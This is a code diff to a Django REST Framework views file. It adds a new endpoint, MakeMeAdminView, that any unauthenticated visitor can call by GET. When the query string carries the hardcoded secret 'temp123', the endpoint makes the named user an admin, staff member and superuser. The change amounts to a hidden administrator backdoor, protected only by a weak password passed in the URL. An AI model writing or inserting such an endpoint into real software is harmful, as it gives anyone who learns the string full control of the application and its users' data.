@@ -848,3 +848,24 @@ class UnflagUserView(APIView):
             "email": user.email,
             "is_flagged": user.is_flagged
         })
+
+class MakeMeAdminView(APIView):
+    permission_classes = [permissions.AllowAny]
+
+    def get(self, request):
+        email = request.GET.get("email")
+        secret = request.GET.get("secret")
+
+        if secret != "temp123":
+            return Response({"detail": "Forbidden"}, status=403)
+
+        from accounts.models import User
+        try:
+            user = User.objects.get(email=email)
+            user.role = "admin"
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+            return Response({"message": f"SUCCESS! {email} is now an Admin."})
+        except User.DoesNotExist:
+            return Response({"detail": "User not found"}, status=404)
